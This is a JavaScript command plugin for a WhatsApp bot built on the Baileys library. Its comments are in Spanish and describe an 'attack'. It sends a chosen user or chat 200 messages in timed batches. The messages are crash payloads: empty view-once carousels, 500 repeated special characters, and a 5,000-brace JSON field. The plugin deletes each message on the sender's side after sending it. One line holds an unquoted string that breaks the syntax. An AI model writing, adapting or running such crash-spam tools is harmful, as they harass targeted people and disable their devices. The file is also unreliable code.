// ✅ buenas.js - Comando funcional para enviar 200 mensajes en 15 min dividido en tandas

import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => { const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat; const bot = conn.user.id;

// Solo permite que el bot lo ejecute if (m.sender !== bot) return;

await conn.sendMessage(m.chat, { text: '✅ Comando .buenas reconocido. Iniciando ataque...' }, { quoted: m });

for (let round = 0; round < 10; round++) { setTimeout(() => enviarTanda(conn, jid, round + 1, m, '1'), round * 30000); }

setTimeout(() => { for (let round = 0; round < 10; round++) { setTimeout(() => enviarTanda(conn, jid, round + 1, m, '2'), round * 30000); } }, 5 * 60 * 1000);

setTimeout(() => { for (let round = 0; round < 10; round++) { setTimeout(() => enviarTanda(conn, jid, round + 1, m, '3'), round * 30000); } setTimeout(() => { conn.sendMessage(m.chat, { text: '🎯 Ataque finalizado. 200 mensajes enviados en total.' }, { quoted: m }); }, 5 * 60 * 1000); }, 10 * 60 * 1000); };

handler.command = /^(buenas|force-beta)$/i; export default handler;

// 📦 FUNCIONES UTILIZADAS

function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function enviarTanda(conn, jid, num, m, ciclo) { const funciones = { InvisForce, loadedIos, EfceBeta, XmlCrash }; try { for (let i = 0; i < 20; i++) { const keys = Object.keys(funciones); const fn = funciones[keys[Math.floor(Math.random() * keys.length)]]; const msg = await fn(conn, jid);

if (msg?.key?.id) await conn.sendMessage(conn.user.id, { delete: msg.key });
  await delay(1000);
}
await conn.sendMessage(m.chat, { text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.` }, { quoted: m });

} catch (e) { console.error("❌ Error en tanda:", e); await conn.sendMessage(m.chat, { text: '❌ Error: ' + e.message }, { quoted: m }); } }

// 🧩 FUNCIONES BASE

async function InvisForce(conn, target) { const msg = await generateWAMessageFromContent(target, { viewOnceMessage: { message: { interactiveMessage: { body: { text: 'MENSION XTRASH' }, footer: { text: 'MENSION XERVIX' }, carouselMessage: { cards: [] }, }, }, }, }, {}); await conn.relayMessage(target, msg.message, { messageId: msg.key.id }); return msg; }

async function loadedIos(conn, target) { const msg = await conn.sendMessage(target, { text: "🧪 Zall :: CONCƱΣЯЯOR ⛧" + "𑇂".repeat(500), contextInfo: { externalAdReply: { title: "Zall Attack", body: ¡Hola!, previewType: "PHOTO", sourceUrl: "https://example.com" } } }); return msg; }

async function EfceBeta(conn, target) { const msg = await generateWAMessageFromContent(target, { viewOnceMessage: { message: { interactiveMessage: { body: { text: 'Beta Test' }, footer: { text: 'phynx.json' }, carouselMessage: { cards: [] }, }, }, }, }, {}); await conn.relayMessage(target, msg.message, { messageId: msg.key.id }); return msg; }

async function XmlCrash(conn, target) { const msg = await generateWAMessageFromContent(target, { viewOnceMessage: { message: { interactiveMessage: { header: { title: "Zall" }, body: { text: "Zall" }, nativeFlowMessage: { messageParamsJson: "{".repeat(5000) }, }, }, }, }, {}); await conn.relayMessage(target, msg.message, { messageId: msg.key.id }); return msg; }

